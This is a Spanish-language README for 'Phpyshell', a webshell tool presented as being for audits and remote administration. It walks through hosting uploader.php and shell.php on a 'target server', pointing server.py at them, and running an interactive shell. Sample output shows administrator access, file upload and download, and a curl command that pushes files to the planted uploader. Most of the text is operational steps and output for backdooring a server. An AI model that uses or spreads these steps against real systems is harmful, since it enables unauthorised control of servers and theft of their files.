# Phpyshell

![License](https://img.shields.io/badge/license-MIT-green)
![PHP](https://img.shields.io/badge/PHP-7.4%2B-blue)
![Platform](https://img.shields.io/badge/Platform-Kali%20Linux-lightgrey)

**Phpyshell** es una WebShell ligera, interactiva y potente diseñada para entornos de auditoría y administración remota.

---

## Instalación

1. **Clonar el repositorio:**
   ```bash
      git clone https://github.com/kr1pt0n/phpyshell.git
      cd phpyshell

2. **Alojar archivos .php en servidor objetivo:**
   ```bash
      http://192.168.20.10:8000/path/uploader.php
      http://192.168.20.10:8000/path/shell.php
   
3. **Comunicar con webshell:**
   Editar **server.py** y agregar endpoints en la seccion
```bash
   ENDPOINTS = [
      "http://192.168.20.10:8000/path/uploader.php",
      "http://192.168.20.10:8000/path/shell.php"
       ]
   ```
4. **Iniciar Servidor y comunicación:**
   ```bash
     python3 server.py
   ```
5. **Respuesta**
   ```bash
     server@zentryx:~/Escritorio$ python3 no.py

============================================================
                  WEBSHELL INTERACTIVA 
============================================================
[*] Iniciando análisis dinámico de comportamiento PHP...


[+] Webshell Confirmado: http://192.168.20.10:8000/path/shell.php
[+] Uploader Confirmado: http://192.168.20.10:8000/path/uploader.php

============================================================
               RESUMEN DE DISPONIBILIDAD
============================================================
 Webshells operativas (GET/system):  1
 Uploaders operativos (POST/move):   1
============================================================

[*] Canal interactivo establecido en: http://192.168.20.10:8000/path/shell.php
[+] Conectado con éxito como: servidor\administrator
[*] Comandos especiales locales:
    -> upload <archivo_local> <nombre_remoto>
    -> download <archivo_remoto> <nombre_local>
    -> exit / clear
    >> Uso de los uploaders

    -> curl -F "file=@/ruta/de/tu/archivo/local" http://192.168.20.10:8000/path/uploader.php
    

(servidor\administrator) C:\path> 

   ```
